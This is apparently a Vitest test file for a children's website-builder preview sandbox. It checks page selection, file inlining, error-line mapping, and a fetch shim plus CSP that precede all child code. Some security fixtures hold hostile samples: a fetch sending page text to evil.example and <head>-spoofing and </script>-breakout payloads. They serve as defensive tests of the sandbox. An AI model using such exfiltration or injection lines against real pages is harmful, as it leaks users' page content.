// @vitest-environment jsdom
// Website Studio srcdoc builder (creative-code-studio-website-prd). Asserts the
// runtime contract the backend's Web Critter prompt teaches: page selection +
// fallbacks, css/js reference inlining with sourceURL + line mapping, server.js
// injected FIRST among kid scripts, the db.query sql postMessage channel to the
// server-side db (D-WEB-15 — behaviour executed in
// buildSitePreview.sqlChannel.test.ts), the fetch/app/nav shims + the
// deny-by-default CSP second fence, asset inlining — and the STUDIO-OWNED
// SKELETON security invariant: the shims + CSP precede every kid byte no matter
// what markup the page contains (a `<head>` hidden in a comment/string must not
// displace them, or the backend's website fetch( allowance loses both its
// fences, D-WEB-03). jsdom env: the builder parses the kid page with DOMParser.

import { describe, expect, it } from 'vitest';

import type { VfsFile } from '../code/codeApi';
import {
  buildSitePreview,
  isSiteNavigateMessage,
  isSiteSqlRequest,
  resolveErrorLoc,
  SITE_HOME_PAGE,
} from './buildSitePreview';

const text = (path: string, content: string): VfsFile => ({
  path,
  content,
  kind: 'text',
  size: content.length,
});
const asset = (path: string, base64: string): VfsFile => ({
  path,
  content: base64,
  kind: 'asset',
  size: base64.length,
});

const page = (body: string, head = '') =>
  `<!doctype html>\n<html>\n<head>\n<meta charset="utf-8">\n${head}</head>\n<body>\n${body}\n</body>\n</html>\n`;

const SITE: VfsFile[] = [
  text('index.html', page('<h1>Home</h1>\n<script src="server.js"></script>\n<script src="script.js"></script>', '<link rel="stylesheet" href="style.css">\n')),
  text('about.html', page('<h2>About</h2>', '<link rel="stylesheet" href="style.css">\n')),
  text('style.css', 'body{color:tomato}'),
  text('script.js', "console.log('page');\nloadPets();"),
  text('server.js', "app.get('/api/pets', (req, res) => res.json(db.pets));"),
  text('data/pets.json', '[{"id":1,"name":"Biscuit"}]'),
];

describe('buildSitePreview — page selection', () => {
  it('renders index.html by default', () => {
    const { srcDoc, currentPage } = buildSitePreview(SITE);
    expect(currentPage).toBe('index.html');
    expect(srcDoc).toContain('<h1>Home</h1>');
  });

  it('opts.page picks another VFS page as the document', () => {
    const { srcDoc, currentPage } = buildSitePreview(SITE, { page: 'about.html' });
    expect(currentPage).toBe('about.html');
    expect(srcDoc).toContain('<h2>About</h2>');
    expect(srcDoc).not.toContain('<h1>Home</h1>');
  });

  it('an unknown page falls back to index.html', () => {
    const { srcDoc, currentPage } = buildSitePreview(SITE, { page: 'nope.html' });
    expect(currentPage).toBe('index.html');
    expect(srcDoc).toContain('<h1>Home</h1>');
  });

  it('no index.html at all renders a friendly kid-facing empty state', () => {
    const { srcDoc, currentPage, scriptRanges } = buildSitePreview([text('style.css', 'x')]);
    expect(currentPage).toBe(SITE_HOME_PAGE);
    expect(srcDoc).toContain('No pages yet!');
    expect(srcDoc).toContain('index.html');
    expect(scriptRanges).toEqual([]);
  });
});

describe('buildSitePreview — reference inlining', () => {
  it('inlines <link rel="stylesheet"> as a <style> with the VFS css', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc).toContain('<style>body{color:tomato}</style>');
    expect(srcDoc).not.toContain('href="style.css"');
  });

  it('inlines <script src> as a classic script carrying //# sourceURL', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc).toContain("console.log('page');");
    expect(srcDoc).toContain('//# sourceURL=script.js');
    expect(srcDoc).not.toContain('src="script.js"');
  });

  it('a missing referenced file becomes a console.error, never a crash', () => {
    const files = [text('index.html', page('<script src="ghost.js"></script>'))];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).toContain('Missing file \\"ghost.js\\"');
    expect(srcDoc).toContain('console.error');
  });

  it('an external script URL is neutralized into a console.error (never loads)', () => {
    const files = [text('index.html', page('<script src="https://evil.example/x.js"></script>'))];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).not.toContain('src="https://evil.example/x.js"');
    expect(srcDoc).toContain('console.error');
  });

  it('a missing stylesheet becomes a console.error too', () => {
    const files = [text('index.html', page('', '<link rel="stylesheet" href="ghost.css">\n'))];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).toContain('Missing file \\"ghost.css\\"');
  });
});

describe('buildSitePreview — server.js is FIRST among kid scripts', () => {
  it('injects server.js before the page scripts and drops the page reference (no double-run)', () => {
    const { srcDoc } = buildSitePreview(SITE);
    const serverAt = srcDoc.indexOf("app.get('/api/pets'");
    const pageAt = srcDoc.indexOf("console.log('page');");
    expect(serverAt).toBeGreaterThan(-1);
    expect(pageAt).toBeGreaterThan(-1);
    expect(serverAt).toBeLessThan(pageAt);
    // The page's own <script src="server.js"> reference must not run it twice.
    expect(srcDoc.split("app.get('/api/pets'").length - 1).toBe(1);
  });

  it('injects server.js even when the page never references it', () => {
    const files = [text('index.html', page('<h2>About</h2>')), SITE[4]];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).toContain("app.get('/api/pets'");
    expect(srcDoc).toContain('//# sourceURL=server.js');
  });
});

describe('buildSitePreview — the site runtime shim + CSP fence', () => {
  // D-WEB-15: the db is server-side — data/*.json seed CONTENT never enters
  // the frame (it is the backend's reset source, not a bundle). The shim only
  // carries the sql channel that reaches that db.
  it('never embeds data/*.json seed content into the srcdoc', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc).not.toContain('Biscuit');
    expect(srcDoc).not.toContain('data/pets.json');
  });

  it('ships db.query as the sql postMessage channel (no in-memory db object)', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc).toContain('window.db = {');
    expect(srcDoc).toContain("action: 'sql'");
    expect(srcDoc).toContain('__airbotixSiteSql');
    // The old in-frame hydration / read-db channel is gone.
    expect(srcDoc).not.toContain('read-db');
    expect(srcDoc).not.toContain('__airbotixSiteDb');
    expect(srcDoc).not.toContain('var carried');
  });

  it('emits a kid-friendly console.error for a CSP violation (blocked pictures are otherwise silent)', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc).toContain("addEventListener('securitypolicyviolation'");
    expect(srcDoc).toContain('Pictures from the internet are blocked');
    // Content-free: the blocked directive drives the hint, never the URL.
    expect(srcDoc).toContain('effectiveDirective');
    expect(srcDoc).not.toContain('e.blockedURI');
  });

  it('ships the app/fetch/nav/sql shims before any kid script', () => {
    const { srcDoc } = buildSitePreview(SITE);
    const shimAt = srcDoc.indexOf('window.app = {');
    expect(shimAt).toBeGreaterThan(-1);
    expect(srcDoc).toContain('window.fetch = function');
    expect(srcDoc).toContain('__airbotixSiteNavigate');
    expect(srcDoc).toContain('__airbotixSiteSql'); // db.query's sql channel
    expect(srcDoc).toContain('the sandbox blocks the outside internet');
    expect(shimAt).toBeLessThan(srcDoc.indexOf("app.get('/api/pets'"));
  });

  it('carries the deny-by-default CSP meta as a second fence', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc).toContain(
      `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; ` +
        `script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; ` +
        `media-src data: blob:; font-src data:; connect-src 'none'">`,
    );
  });
});

// The STUDIO-OWNED SKELETON invariant (adversarial-review fix): the shims + CSP
// must precede EVERY kid byte, no matter what the page contains — the injection
// point is never located by matching markup in untrusted HTML.
describe('buildSitePreview — skeleton beats <head> spoofing (security)', () => {
  /** Position of the fetch shim vs. the FIRST kid byte in the document. */
  const fenceHolds = (srcDoc: string, kidMarker: string) => {
    const shimAt = srcDoc.indexOf('window.fetch = function');
    const cspAt = srcDoc.indexOf('Content-Security-Policy');
    const kidAt = srcDoc.indexOf(kidMarker);
    expect(shimAt).toBeGreaterThan(-1);
    expect(cspAt).toBeGreaterThan(-1);
    expect(kidAt).toBeGreaterThan(-1);
    expect(shimAt).toBeLessThan(kidAt);
    expect(cspAt).toBeLessThan(kidAt);
  };

  it('always emits the studio skeleton first', () => {
    const { srcDoc } = buildSitePreview(SITE);
    expect(srcDoc.startsWith('<!doctype html>\n<html><head><meta charset="utf-8">')).toBe(true);
  });

  it('carries the kid page\'s <html> attributes into the skeleton (lang, class)', () => {
    // Every backend template ships <html lang="en">, and `<html class="dark">`
    // pairs with `html.dark {…}` CSS — dropping them would render the preview
    // differently from what the kid reads in the editor.
    const files = [
      text(
        'index.html',
        '<!doctype html><html lang="en" class="dark"><head></head><body><h1>Hi</h1></body></html>',
      ),
    ];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).toContain('<html lang="en" class="dark"><head>');
    // …and the shims still come first.
    fenceHolds(srcDoc, '<h1>Hi</h1>');
  });

  it('carries <body> attributes too, and escapes & and " on the round trip', () => {
    const files = [
      text(
        'index.html',
        '<html><head></head><body class="a &amp; b" data-q="say &quot;hi&quot;"><p>x</p></body></html>',
      ),
    ];
    const { srcDoc } = buildSitePreview(files);
    // `&` escaped BEFORE `"` — entity-like text survives verbatim (no double-decode).
    expect(srcDoc).toContain('<body class="a &amp; b" data-q="say &quot;hi&quot;">');
  });

  it('a <head> hidden in a COMMENT cannot displace the shims/CSP', () => {
    const files = [
      text(
        'index.html',
        `<!--<head>--><html><body><script>fetch('https://evil.example/?d='+document.body.innerText)</script></body></html>`,
      ),
    ];
    const { srcDoc } = buildSitePreview(files);
    fenceHolds(srcDoc, "fetch('https://evil.example");
  });

  it('a <head> hidden in a SCRIPT STRING LITERAL cannot displace the shims/CSP', () => {
    const files = [
      text(
        'index.html',
        `<html><body><script>var s = "<head>"; fetch('https://evil.example/x')</script></body></html>`,
      ),
    ];
    const { srcDoc } = buildSitePreview(files);
    fenceHolds(srcDoc, "fetch('https://evil.example/x')");
  });

  it('a page with NO <head> at all still gets the shims first and its scripts inlined', () => {
    const files = [
      text('index.html', '<body><h1>Hi</h1><script src="script.js"></script></body>'),
      text('script.js', "console.log('no-head page');"),
    ];
    const { srcDoc, scriptRanges } = buildSitePreview(files);
    fenceHolds(srcDoc, "console.log('no-head page');");
    expect(srcDoc).toContain('<h1>Hi</h1>');
    expect(scriptRanges.some((r) => r.path === 'script.js')).toBe(true);
  });

  it('a literal </script> in a kid js file cannot truncate the studio tag (ranges stay true)', () => {
    const files = [
      text('index.html', page('<script src="script.js"></script>')),
      text('script.js', 'var s = "</script><script>alert(1)</script>";\nconsole.log(s);'),
    ];
    const { srcDoc, scriptRanges } = buildSitePreview(files);
    // Escaped inside the tag — the raw close sequence never appears mid-content.
    expect(srcDoc).toContain('var s = "<\\/script><script>alert(1)<\\/script>";');
    const range = scriptRanges.find((r) => r.path === 'script.js')!;
    expect(range.end - range.start).toBe(1); // both lines survived in ONE script
    const lines = srcDoc.split('\n');
    expect(lines[range.end - 1]).toContain('console.log(s);');
  });
});

describe('buildSitePreview — asset inlining', () => {
  const dog = asset('assets/dog.png', 'AAAA');

  it('rewrites quoted asset paths in the page HTML to data: URLs', () => {
    const files = [text('index.html', page('<img src="assets/dog.png">')), dog];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).toContain('src="data:image/png;base64,AAAA"');
  });

  it('rewrites asset paths inside inlined css and js', () => {
    const files = [
      text('index.html', page('<script src="script.js"></script>', '<link rel="stylesheet" href="style.css">\n')),
      text('style.css', "body{background-image:url('assets/dog.png')}"),
      text('script.js', "const pic = 'assets/dog.png';"),
      dog,
    ];
    const { srcDoc } = buildSitePreview(files);
    expect(srcDoc).toContain("url('data:image/png;base64,AAAA')");
    expect(srcDoc).toContain("const pic = 'data:image/png;base64,AAAA';");
  });

  it('inlines virtualAssets (class shared assets) exactly like VFS assets', () => {
    const files = [text('index.html', page('<img src="assets/class/hero.png">'))];
    const virtual = asset('assets/class/hero.png', 'BBBB');
    const { srcDoc } = buildSitePreview(files, { virtualAssets: [virtual] });
    expect(srcDoc).toContain('src="data:image/png;base64,BBBB"');
  });
});

describe('buildSitePreview — scriptRanges map syntax errors back to kid files', () => {
  it('ranges cover each inlined script, content starting ON the <script> line', () => {
    const { srcDoc, scriptRanges } = buildSitePreview(SITE);
    const byPath = Object.fromEntries(scriptRanges.map((r) => [r.path, r]));
    expect(byPath['server.js']).toBeDefined();
    expect(byPath['script.js']).toBeDefined();
    // script.js is two lines long.
    expect(byPath['script.js'].end - byPath['script.js'].start).toBe(1);
    // The range's start line really is where the content begins in the srcdoc.
    const lines = srcDoc.split('\n');
    expect(lines[byPath['script.js'].start - 1]).toContain("console.log('page');");
    expect(lines[byPath['server.js'].start - 1]).toContain("app.get('/api/pets'");
  });

  it('resolveErrorLoc maps a srcdoc line back to the kid file:line', () => {
    const { scriptRanges } = buildSitePreview(SITE);
    const range = scriptRanges.find((r) => r.path === 'script.js')!;
    const loc = resolveErrorLoc(
      { file: 'about:srcdoc', line: range.start + 1, col: 3 },
      scriptRanges,
    );
    expect(loc).toEqual({ file: 'script.js', line: 2, col: 3 });
  });

  it('a loc already carrying the kid file (sourceURL) passes through', () => {
    const { scriptRanges } = buildSitePreview(SITE);
    const loc = { file: 'server.js', line: 1, col: 1 };
    expect(resolveErrorLoc(loc, scriptRanges)).toEqual(loc);
  });
});

describe('isSiteNavigateMessage', () => {
  it('accepts the nav shim message and rejects other shapes', () => {
    expect(isSiteNavigateMessage({ __airbotixSiteNavigate: true, path: 'about.html' })).toBe(true);
    expect(isSiteNavigateMessage({ __airbotixSiteNavigate: true })).toBe(false);
    expect(isSiteNavigateMessage({ __airbotixConsole: true })).toBe(false);
    expect(isSiteNavigateMessage(null)).toBe(false);
  });
});

describe('isSiteSqlRequest', () => {
  it('accepts the shim sql request and rejects other shapes', () => {
    expect(
      isSiteSqlRequest({
        __airbotixSiteControl: true,
        action: 'sql',
        id: 1,
        sql: 'SELECT * FROM pets',
        params: [],
      }),
    ).toBe(true);
    // Other control actions, a missing id/sql, and foreign messages all fail.
    expect(isSiteSqlRequest({ __airbotixSiteControl: true, action: 'report' })).toBe(false);
    expect(isSiteSqlRequest({ __airbotixSiteControl: true, action: 'sql', sql: 'SELECT 1' })).toBe(false);
    expect(isSiteSqlRequest({ __airbotixSiteControl: true, action: 'sql', id: 1 })).toBe(false);
    expect(isSiteSqlRequest({ __airbotixSiteNavigate: true, path: 'a.html' })).toBe(false);
    expect(isSiteSqlRequest(null)).toBe(false);
  });
});
